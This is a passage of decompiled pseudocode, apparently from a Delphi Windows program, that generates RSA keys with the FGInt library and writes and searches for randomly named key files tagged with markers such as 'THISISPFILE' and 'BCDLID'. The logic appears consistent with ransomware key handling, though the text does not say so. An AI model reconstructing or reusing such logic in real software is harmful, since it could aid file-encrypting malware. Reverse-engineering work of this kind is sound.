  FUN_004047cc(&local_10,3);
  piStack56 = (int *)0x435dd4;
  FUN_004047cc((int *)&param_6,3);
  return;
}



void FUN_00435ef8(int param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  char *pcVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int *in_FS_OFFSET;
  char **ppcVar7;
  byte **ppbVar8;
  int iStack420;
  undefined *puStack416;
  undefined *puStack412;
  undefined *local_190;
  undefined *local_18c;
  undefined4 *local_188;
  undefined4 *local_184;
  byte *local_180;
  byte *local_17c;
  HANDLE local_178 [83];
  undefined4 *local_2c;
  int *local_28 [2];
  undefined local_20 [8];
  char *local_18;
  int *local_14;
  int local_10;
  int local_c;
  int local_8;
  
  local_190 = (undefined *)0x0;
  local_18c = (undefined *)0x0;
  local_188 = (undefined4 *)0x0;
  local_184 = (undefined4 *)0x0;
  local_180 = (byte *)0x0;
  local_17c = (byte *)0x0;
  local_14 = (int *)0x0;
  local_18 = (char *)0x0;
  local_2c = (undefined4 *)0x0;
  puStack412 = (undefined *)0x435f43;
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_00404c58(param_1);
  puStack412 = (undefined *)0x435f4b;
  FUN_00404c58(local_c);
  puStack412 = (undefined *)0x435f53;
  FUN_00404c58(local_10);
  puStack412 = (undefined *)0x435f5b;
  FUN_00404c58(param_4);
  puStack412 = (undefined *)0x435f69;
  FUN_00405100((int)local_20,(int)&DAT_00415450);
  puStack412 = (undefined *)0x435f77;
  FUN_00405100((int)local_28,(int)&DAT_00415450);
  puStack416 = &LAB_0043621e;
  iStack420 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack420;
  puStack412 = &stack0xfffffffc;
  FUN_004047a8((int *)&local_14);
  iVar1 = param_4;
  FUN_00404b28(&local_14,7);
  FUN_00404840((int *)&local_18,
               (int)
               "JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ"
              );
  ppcVar7 = &local_18;
  pcVar2 = FUN_00404d50("|||",local_18);
  FUN_00404cc8((int)local_18,1,(uint)(pcVar2 + -1),(int *)ppcVar7);
  if (local_18 != (char *)0x0) {
    ppbVar8 = &local_17c;
    pcVar2 = FUN_00404d50(":",local_18);
    uVar3 = FUN_00404a68((int)local_18);
    FUN_00404cc8((int)local_18,(int)(pcVar2 + 1),uVar3,(int *)ppbVar8);
    FUN_00415c1c(local_17c,local_20);
    ppbVar8 = &local_180;
    pcVar2 = FUN_00404d50(":",local_18);
    FUN_00404cc8((int)local_18,1,(uint)(pcVar2 + -1),(int *)ppbVar8);
    FUN_00415c1c(local_180,(undefined *)local_28);
    FUN_00418090((int)local_14,(int)local_20,(char *)local_28,(int *)&local_14);
    FUN_00415fa8((int)local_20);
    FUN_00415fa8((int)local_28);
    FUN_00404ab4((int *)&local_14,(undefined4 *)"THISISPFILE",local_14);
    FUN_004047a8((int *)&local_2c);
    while (local_2c != (undefined4 *)0x0) {
      FUN_00404ab4((int *)&local_18c,DAT_00442964,local_2c);
      uVar3 = FUN_00408524(local_18c);
      if ((char)uVar3 != '\x01') break;
      FUN_004047a8((int *)&local_2c);
      iVar4 = 10;
      do {
        FUN_004029e8();
        uVar3 = FUN_004030c0(0x1a);
        FUN_00404990((int *)&local_184,uVar3 & 0xffffff00 | (uint)(byte)((char)uVar3 + 0x41));
        FUN_00404a70((int *)&local_2c,local_184);
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
      FUN_00404a70((int *)&local_2c,(undefined4 *)&DAT_00436378);
      iVar4 = 3;
      do {
        FUN_004029e8();
        uVar3 = FUN_004030c0(0x1a);
        FUN_00404990((int *)&local_188,uVar3 & 0xffffff00 | (uint)(byte)((char)uVar3 + 0x41));
        FUN_00404a70((int *)&local_2c,local_188);
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
    }
    FUN_00404ab4((int *)&local_190,DAT_00442964,local_2c);
    FUN_00402d24(local_178,local_190);
    FUN_004033d0(local_178,(HANDLE)0x1);
    FUN_004027bc();
    FUN_004033b4(local_178,(HANDLE)0x1);
    FUN_004027bc();
    iVar4 = FUN_00404a68((int)local_14);
    if (0 < iVar4) {
      iVar6 = 1;
      do {
        iVar5 = thunk_FUN_00404c74((int *)&local_14);
        FUN_004034b0(local_178,(LPCVOID)(iVar5 + -1 + iVar6));
        FUN_004027bc();
        iVar6 = iVar6 + 1;
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
    }
    FUN_00402ec8((undefined *)local_178);
    FUN_004027bc();
  }
  *in_FS_OFFSET = iVar1;
  FUN_004047cc((int *)&local_190,6);
  FUN_004047a8((int *)&local_2c);
  FUN_0040521c(local_28,"\x0e\x06TFGInt\b",2);
  FUN_004047cc((int *)&local_18,5);
  FUN_004047a8(&param_4);
  return;
}



void FUN_0043637c(void)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int unaff_EDI;
  int *in_FS_OFFSET;
  undefined uVar5;
  undefined4 *local_90;
  undefined *local_8c;
  undefined4 *local_88;
  undefined4 *local_84;
  undefined4 *local_80;
  undefined4 *local_7c;
  undefined4 *local_78;
  uint *local_74;
  int *local_70 [2];
  char local_68 [8];
  undefined4 local_60;
  undefined4 local_58;
  undefined *puStack84;
  undefined4 local_50;
  char *pcStack76;
  undefined *local_48;
  undefined4 uStack68;
  char local_40 [4];
  int **ppiStack60;
  int **local_38;
  int **ppiStack52;
  int **local_30;
  undefined *puVar6;
  char *local_10;
  int local_c;
  int local_8;
  
  local_10 = (char *)0x11;
  do {
    local_8 = 0;
    local_10 = local_10 + -1;
  } while (local_10 != (char *)0x0);
  FUN_00405100((int)&stack0xffffffe0,(int)&DAT_00415450);
  FUN_00405100((int)&stack0xffffffd8,(int)&DAT_00415450);
  FUN_00405100((int)&local_30,(int)&DAT_00415450);
  FUN_00405100((int)&local_38,(int)&DAT_00415450);
  FUN_00405100((int)local_40,(int)&DAT_00415450);
  FUN_00405100((int)&local_48,(int)&DAT_00415450);
  FUN_00405100((int)&local_50,(int)&DAT_00415450);
  FUN_00405100((int)&local_58,(int)&DAT_00415450);
  FUN_00405100((int)&local_60,(int)&DAT_00415450);
  FUN_00405100((int)local_68,(int)&DAT_00415450);
  FUN_00405100((int)local_70,(int)&DAT_00415450);
  puVar6 = &DAT_004367b9;
  *in_FS_OFFSET = (int)&stack0xffffffd8;
  do {
    FUN_004047a8(&local_8);
    FUN_004047a8(&local_c);
    iVar4 = 0x80;
    do {
      FUN_004029e8();
      uVar1 = FUN_004030c0(0x100);
      FUN_00404990((int *)&local_78,uVar1);
      FUN_00404a70(&local_8,local_78);
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
    iVar4 = 0x80;
    do {
      FUN_004029e8();
      uVar1 = FUN_004030c0(0x100);
      FUN_00404990((int *)&local_7c,uVar1);
      FUN_00404a70(&local_c,local_7c);
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
    FUN_00415a88(local_8,&stack0xffffffd8);
    FUN_00418730(&stack0xffffffd8);
    FUN_00415a88(local_c,&stack0xffffffe0);
    FUN_00418730(&stack0xffffffe0);
    FUN_00416798(&stack0xffffffd8,&stack0xffffffe0,local_40);
    *(int *)(puVar6 + 4) = *(int *)(puVar6 + 4) + -1;
    *(int *)(unaff_EDI + 4) = *(int *)(unaff_EDI + 4) + -1;
    FUN_00416798(&stack0xffffffd8,&stack0xffffffe0,(undefined *)&local_48);
    FUN_00415c1c((byte *)"65537",(undefined *)&local_30);
    FUN_00415c1c(&DAT_004367e0,(undefined *)&local_50);
    FUN_00415c1c(&DAT_004367ec,(undefined *)&local_58);
    FUN_004179e4((undefined *)&local_48,(undefined *)&local_30,(undefined *)&local_60);
    while( true ) {
      uVar2 = FUN_00415fbc((uint)&local_60,(int)&local_50);
      uVar5 = (char)uVar2 == '\x02';
      if ((bool)uVar5) break;
      FUN_00416028((char *)&local_30,(char *)&local_58,local_68);
      FUN_004164f8(local_68,(undefined *)&local_30);
      FUN_004179e4((undefined *)&local_48,(undefined *)&local_30,(undefined *)&local_60);
    }
    FUN_00415fa8((int)&local_58);
    FUN_00415fa8((int)&local_50);
    FUN_00415fa8((int)&local_60);
    FUN_00417e0c((undefined *)&local_30,(char *)&local_48,(char *)&local_38);
    FUN_00415fa8((int)&local_48);
    FUN_00415fa8((int)local_70);
    FUN_00415e7c((char *)&local_30,&local_10);
    FUN_00415e7c((char *)&local_38,(char **)&stack0xffffffec);
    FUN_00415e7c(local_40,(char **)&stack0xffffffe8);
    FUN_00404840((int *)&local_74,(int)"12345678900987654321");
    local_30 = (int **)0x4365e1;
    FUN_00418090((int)local_74,(int)&local_30,local_40,(int *)&local_74);
    local_30 = local_70;
    ppiStack52 = local_70;
    local_38 = local_70;
    ppiStack60 = local_70;
    uStack68 = 0x436603;
    FUN_00418300((int)local_74,(int)&local_38,local_40,(int *)&local_74,(char *)ppiStack60,
                 (char *)local_38,(int)ppiStack52,(int)local_30);
    uStack68 = 0x436610;
    FUN_00404bb4(local_74,(uint *)"12345678900987654321");
  } while (!(bool)uVar5);
  uStack68 = 0x43661e;
  FUN_00415fa8((int)&local_30);
  uStack68 = 0x436626;
  FUN_00415fa8((int)&local_38);
  uStack68 = 0x43662e;
  FUN_00415fa8((int)local_40);
  local_48 = &DAT_00436818;
  pcStack76 = local_10;
  local_50 = 0x436648;
  FUN_00404b28((int **)&DAT_00442954,3);
  puStack84 = &DAT_00436818;
  FUN_00404b28((int **)&DAT_00442958,3);
  FUN_004047a8(&DAT_00442950);
  iVar4 = 1;
  do {
    FUN_004029e8();
    iVar3 = FUN_004030c0(2);
    if (iVar3 == 0) {
      FUN_004029e8();
      uVar2 = FUN_004030c0(10);
      FUN_0040803c(uVar2,(int *)&local_80);
      FUN_00404a70(&DAT_00442950,local_80);
    }
    else {
      iVar3 = FUN_004030c0(2);
      if (iVar3 == 0) {
        FUN_004029e8();
        uVar2 = FUN_004030c0(0x1a);
        FUN_00404990((int *)&local_84,uVar2 & 0xffffff00 | (uint)(byte)((char)uVar2 + 0x41));
        FUN_00404a70(&DAT_00442950,local_84);
      }
      else {
        FUN_004029e8();
        uVar2 = FUN_004030c0(0x1a);
        FUN_00404990((int *)&local_8c,uVar2 & 0xffffff00 | (uint)(byte)((char)uVar2 + 0x41));
        FUN_00407ee4(local_8c,(LPSTR *)&local_88);
        FUN_00404a70(&DAT_00442950,local_88);
      }
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 != 0x801);
  FUN_004047a8(&DAT_00442968);
  iVar4 = 1;
  do {
    FUN_004029e8();
    uVar2 = FUN_004030c0(10);
    FUN_0040803c(uVar2,(int *)&local_90);
    FUN_00404a70(&DAT_00442968,local_90);
    iVar4 = iVar4 + 1;
  } while (iVar4 != 0x15);
  local_60 = 0x43677b;
  iVar4 = DAT_00442968;
  FUN_00435ef8(DAT_00442954,DAT_00442958,DAT_00442950,DAT_00442968);
  *in_FS_OFFSET = iVar4;
  puStack84 = (undefined *)0x4367c0;
  local_58 = 0x436798;
  FUN_004047cc((int *)&local_90,8);
  local_58 = 0x4367ab;
  FUN_0040521c(local_70,"\x0e\x06TFGInt\b",0xb);
  local_58 = 0x4367b8;
  FUN_004047cc((int *)&stack0xffffffe8,5);
  return;
}



void FUN_0043681c(undefined *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined *puVar1;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined *local_8;
  
  puStack12 = (undefined *)0x43682b;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack16 = &LAB_0043687f;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  puVar1 = &DAT_00442f74;
  puStack12 = &stack0xfffffffc;
  FUN_00435100(local_8,DAT_00442950,(char)DAT_00442958,&DAT_00442f74,&DAT_00442f6c,DAT_00442968,
               DAT_00442960,DAT_0044295c);
  *in_FS_OFFSET = puVar1;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0043688c(int *param_1)

{
  DWORD DVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  bool bVar3;
  undefined uVar4;
  undefined4 uStack860;
  undefined *puStack856;
  undefined *puStack852;
  undefined4 uStack848;
  undefined *puStack844;
  undefined *puStack840;
  undefined *local_338;
  undefined *local_334;
  WORD local_330 [4];
  byte local_328;
  uint *local_324;
  undefined4 local_1d8 [115];
  uint *local_c;
  int *local_8;
  
  local_338 = (undefined *)0x0;
  local_334 = (undefined *)0x0;
  local_c = (uint *)0x0;
  puStack840 = (undefined *)0x4368bd;
  local_8 = param_1;
  FUN_00405100((int)local_330,(int)&DAT_00407150);
  puStack844 = &LAB_00436a52;
  uStack848 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack848;
  puStack852 = (undefined *)0x4368d3;
  puStack840 = &stack0xfffffffc;
  FUN_004047a8(local_8);
  puStack852 = (undefined *)0x4368e9;
  FUN_00404ab4((int *)&local_334,DAT_00442964,(undefined4 *)&DAT_00436a68);
  puStack852 = (undefined *)0x4368ff;
  DVar1 = FUN_004086a4(local_334,0x3f,local_330);
  bVar3 = DVar1 == 0;
  if (bVar3) {
    do {
      puStack852 = (undefined *)0x436917;
      FUN_00404bb4(local_324,(uint *)&DAT_00436a74);
      if (!bVar3) {
        puStack852 = (undefined *)0x43692d;
        FUN_00404bb4(local_324,(uint *)&DAT_00436a80);
        if ((!bVar3) && ((local_328 & 0x10) == 0)) {
          uVar4 = 1;
          puStack856 = &LAB_004369f3;
          uStack860 = *in_FS_OFFSET;
          *in_FS_OFFSET = &uStack860;
          *PTR_DAT_00441544 = 0;
          puStack852 = &stack0xfffffffc;
          FUN_00404ab4((int *)&local_338,DAT_00442964,local_324);
          FUN_00402d24(local_1d8,local_338);
          *PTR_DAT_00441544 = 0;
          FUN_00402aa8((undefined *)local_1d8);
          FUN_004027bc();
          *PTR_DAT_00441544 = 2;
          FUN_00403210((undefined *)local_1d8,(int *)&local_c);
          FUN_0040327c((undefined *)local_1d8);
          FUN_004027bc();
          FUN_00402ec8((undefined *)local_1d8);
          FUN_004027bc();
          FUN_00404bb4(local_c,(uint *)"BCDLID");
          if ((bool)uVar4) {
            FUN_004047fc(local_8,local_324);
          }
          *in_FS_OFFSET = uStack860;
        }
      }
      puStack852 = (undefined *)0x436a08;
      iVar2 = FUN_004086f4(local_330);
      bVar3 = iVar2 == 0;
    } while (bVar3);
    puStack852 = (undefined *)0x436a1b;
    FUN_00408718((int)local_330);
  }
  *in_FS_OFFSET = uStack848;
  puStack840 = &LAB_00436a59;
  puStack844 = (undefined *)0x436a38;
  FUN_004047cc((int *)&local_338,2);
  puStack844 = (undefined *)0x436a49;
  FUN_004051d0((int)local_330,(int)&DAT_00407150);
  puStack844 = (undefined *)0x436a51;
  FUN_004047a8((int *)&local_c);
  return;
}



void FUN_00436a94(void)

{
  uint uVar1;
  char *pcVar2;
  undefined *puVar3;
  int iVar4;
  undefined4 extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 *in_FS_OFFSET;
  undefined uVar5;
  float10 in_ST0;
  undefined *local_23c;
  undefined *local_238;
  uint local_234;
  int local_230;
  uint local_22c;
  int local_228;
  uint local_224;
  int local_220;
  uint local_21c;
  int local_218;
  uint local_214;
  int local_210;
  uint local_20c;
  int local_208;
  uint local_204;
  int local_200;
  uint local_1fc;
  int local_1f8;
  uint local_1f4;
  int local_1f0;
  uint local_1ec;
  int local_1e8;
  undefined4 *local_1e4;
  undefined *local_1e0;
  undefined4 *local_1dc;
  undefined4 *local_1d8;
  undefined4 *local_1d4;
  undefined4 local_1d0 [99];
  undefined4 uStackY68;
  char *pcStackY64;
  undefined *puStackY56;
  int *piVar6;
  undefined4 in_stack_ffffffd0;
  uint *puVar7;
  ulonglong uVar8;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  
  puStack28 = &stack0xfffffffc;
  iVar4 = 0x47;
  do {
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  puStack32 = &LAB_004371a7;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  FUN_004047a8((int *)&DAT_0044296c);
  FUN_0043688c((int *)&local_1d4);
  FUN_004047fc((int *)&DAT_0044296c,local_1d4);
  uVar5 = DAT_0044296c == (undefined4 *)0x0;
  if ((bool)uVar5) {
    while (DAT_0044296c == (undefined4 *)0x0) {
      iVar4 = 10;
      do {
        uVar1 = FUN_004030c0(0x1a);
        FUN_00404990((int *)&local_1d8,uVar1 & 0xffffff00 | (uint)(byte)((char)uVar1 + 0x41));
        FUN_00404a70((int *)&DAT_0044296c,local_1d8);
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
      FUN_00404a70((int *)&DAT_0044296c,(undefined4 *)&DAT_004371c0);
      iVar4 = 3;
      do {
        uVar1 = FUN_004030c0(0x1a);
        FUN_00404990((int *)&local_1dc,uVar1 & 0xffffff00 | (uint)(byte)((char)uVar1 + 0x41));
        FUN_00404a70((int *)&DAT_0044296c,local_1dc);
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
      FUN_00404ab4((int *)&local_1e0,DAT_00442964,DAT_0044296c);
      uVar1 = FUN_00408524(local_1e0);
      if ((char)uVar1 != '\0') {
        FUN_004047a8((int *)&DAT_0044296c);
      }
    }
    iVar4 = 0x24;
    do {
      FUN_004029e8();
      uVar1 = FUN_004030c0(0x1a);
      FUN_00404990((int *)&local_1e4,uVar1 & 0xffffff00 | (uint)(byte)((char)uVar1 + 0x41));
      FUN_00404a70((int *)&DAT_0044295c,local_1e4);
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
    FUN_00404a70((int *)&DAT_0044295c,(undefined4 *)&DAT_004371cc);
    FUN_00409bb0();
    FUN_0040a7e8(&local_1e8,extraout_EDX,extraout_ECX,SUB84((double)in_ST0,0),
                 (int)((ulonglong)(double)in_ST0 >> 0x20));
    uVar1 = FUN_004030c0(10000000);
    FUN_0040803c(uVar1,(int *)&local_1ec);
    uVar8 = (ulonglong)local_1ec;
    FUN_00404b28((int **)&DAT_0044295c,3);
    while (pcVar2 = FUN_00404d50(":",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_1f0;
      puStackY56 = (undefined *)0x436c22;
      pcVar2 = FUN_00404d50(":",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436c31;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_1f4;
      pcStackY64 = (char *)0x436c4f;
      pcStackY64 = FUN_00404d50(":",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436c58;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436c62;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_1f4;
      pcStackY64 = (char *)0x436c74;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50("\\",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_1f8;
      puStackY56 = (undefined *)0x436c99;
      pcVar2 = FUN_00404d50("\\",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436ca8;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_1fc;
      pcStackY64 = (char *)0x436cc6;
      pcStackY64 = FUN_00404d50("\\",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436ccf;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436cd9;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_1fc;
      pcStackY64 = (char *)0x436ceb;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50("/",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_200;
      puStackY56 = (undefined *)0x436d10;
      pcVar2 = FUN_00404d50("/",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436d1f;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_204;
      pcStackY64 = (char *)0x436d3d;
      pcStackY64 = FUN_00404d50("/",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436d46;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436d50;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_204;
      pcStackY64 = (char *)0x436d62;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50("*",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_208;
      puStackY56 = (undefined *)0x436d87;
      pcVar2 = FUN_00404d50("*",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436d96;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_20c;
      pcStackY64 = (char *)0x436db4;
      pcStackY64 = FUN_00404d50("*",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436dbd;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436dc7;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_20c;
      pcStackY64 = (char *)0x436dd9;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50("?",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_210;
      puStackY56 = (undefined *)0x436dfe;
      pcVar2 = FUN_00404d50("?",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436e0d;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_214;
      pcStackY64 = (char *)0x436e2b;
      pcStackY64 = FUN_00404d50("?",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436e34;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436e3e;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_214;
      pcStackY64 = (char *)0x436e50;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50("<",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_218;
      puStackY56 = (undefined *)0x436e75;
      pcVar2 = FUN_00404d50("<",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436e84;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_21c;
      pcStackY64 = (char *)0x436ea2;
      pcStackY64 = FUN_00404d50("<",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436eab;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436eb5;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_21c;
      pcStackY64 = (char *)0x436ec7;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50(">",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_220;
      puStackY56 = (undefined *)0x436eec;
      pcVar2 = FUN_00404d50(">",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436efb;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_224;
      pcStackY64 = (char *)0x436f19;
      pcStackY64 = FUN_00404d50(">",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436f22;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436f2c;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_224;
      pcStackY64 = (char *)0x436f3e;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while (pcVar2 = FUN_00404d50("\"",(char *)DAT_0044295c), pcVar2 != (char *)0x0) {
      piVar6 = &local_228;
      puStackY56 = (undefined *)0x436f63;
      pcVar2 = FUN_00404d50("\"",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436f72;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_22c;
      pcStackY64 = (char *)0x436f90;
      pcStackY64 = FUN_00404d50("\"",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x436f99;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x436fa3;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_22c;
      pcStackY64 = (char *)0x436fb5;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    while( true ) {
      in_stack_ffffffd0 = (undefined4)uVar8;
      pcVar2 = FUN_00404d50("|",(char *)DAT_0044295c);
      if (pcVar2 == (char *)0x0) break;
      piVar6 = &local_230;
      puStackY56 = (undefined *)0x436fda;
      pcVar2 = FUN_00404d50("|",(char *)DAT_0044295c);
      puStackY56 = (undefined *)0x436fe9;
      FUN_00404cc8((int)DAT_0044295c,1,(uint)(pcVar2 + -1),piVar6);
      puStackY56 = &DAT_004371e4;
      puVar7 = &local_234;
      pcStackY64 = (char *)0x437007;
      pcStackY64 = FUN_00404d50("|",(char *)DAT_0044295c);
      pcStackY64 = pcStackY64 + 1;
      uStackY68 = 0x437010;
      uVar1 = FUN_00404a68((int)DAT_0044295c);
      pcVar2 = pcStackY64;
      pcStackY64 = (char *)0x43701a;
      FUN_00404cc8((int)DAT_0044295c,(int)pcVar2,uVar1,(int *)puVar7);
      uVar8 = (ulonglong)local_234;
      pcStackY64 = (char *)0x43702c;
      FUN_00404b28((int **)&DAT_0044295c,3);
    }
    FUN_00404ab4((int *)&local_238,DAT_00442964,DAT_0044296c);
    FUN_00402d24(local_1d0,local_238);
    FUN_00402ab4((undefined *)local_1d0);
    FUN_004027bc();
    FUN_00402ac0((undefined *)local_1d0);
    FUN_004027bc();
    puVar3 = (undefined *)FUN_00404dfc((undefined *)local_1d0,"BCDLID");
    FUN_0040360c(puVar3,extraout_EDX_00,extraout_ECX_00);
    FUN_004027bc();
    puVar3 = (undefined *)FUN_00404dfc((undefined *)local_1d0,"noneend");
    FUN_0040360c(puVar3,extraout_EDX_01,extraout_ECX_01);
    FUN_004027bc();
    puVar3 = (undefined *)FUN_00404dfc((undefined *)local_1d0,(undefined *)DAT_0044295c);
    FUN_0040360c(puVar3,extraout_EDX_02,extraout_ECX_02);
    FUN_004027bc();
    FUN_00402ec8((undefined *)local_1d0);
    FUN_004027bc();
  }
  else {
    FUN_00404ab4((int *)&local_23c,DAT_00442964,DAT_0044296c);
    FUN_00402d24(local_1d0,local_23c);
    FUN_00402aa8((undefined *)local_1d0);
    FUN_004027bc();
    FUN_00403210((undefined *)local_1d0,(int *)&DAT_0044295c);
    FUN_0040327c((undefined *)local_1d0);
    FUN_004027bc();
    FUN_00403210((undefined *)local_1d0,(int *)&DAT_0044295c);
    FUN_0040327c((undefined *)local_1d0);
    FUN_004027bc();
    FUN_00404bb4(DAT_0044295c,(uint *)"noneend");
    if ((bool)uVar5) {
      FUN_00403210((undefined *)local_1d0,(int *)&DAT_0044295c);
      FUN_0040327c((undefined *)local_1d0);
      FUN_004027bc();
    }
    FUN_00402ec8((undefined *)local_1d0);
    FUN_004027bc();
  }
  *in_FS_OFFSET = in_stack_ffffffd0;
  FUN_004047cc((int *)&local_23c,0x1b);
  return;
}



void FUN_00437268(undefined *param_1,int *param_2)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack76;
  undefined *puStack72;
  undefined *puStack68;
  char *pcStack64;
  undefined4 uStack60;
  undefined4 uStack56;
  undefined4 uStack52;
  undefined4 uStack48;
  undefined4 uStack44;
  undefined *puStack40;
  undefined *puStack36;
  undefined4 *local_10;
  int *local_c;
  undefined *local_8;
  
